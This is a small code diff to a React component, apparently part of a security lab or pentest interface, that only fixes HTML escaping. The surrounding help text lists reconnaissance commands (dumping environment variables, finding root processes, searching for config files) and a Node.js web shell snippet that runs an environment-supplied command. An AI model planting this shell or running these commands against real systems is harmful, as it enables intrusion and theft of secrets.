@@ -126,7 +126,7 @@ const DestinationSelector = ({
               • cmd:env<br />
               • cmd:pwd<br />
               • cmd:ps aux | grep root<br />
-              • cmd:find / -name "*.conf" 2>/dev/null
+              • cmd:find / -name "*.conf" 2&gt;/dev/null
             </p>
           </div>
         )}
@@ -151,7 +151,7 @@ const DestinationSelector = ({
               
               3. <strong>Node.js Web Shell:</strong> Create a file with <code>.js</code> extension containing:<br />
               <code>
-                const &#123; exec &#125; = require('child_process');<br />
+                const {"{"}exec{"}"} = require('child_process');<br />
                 exec(process.env.CMD || 'ls -la');
               </code>
             </p>
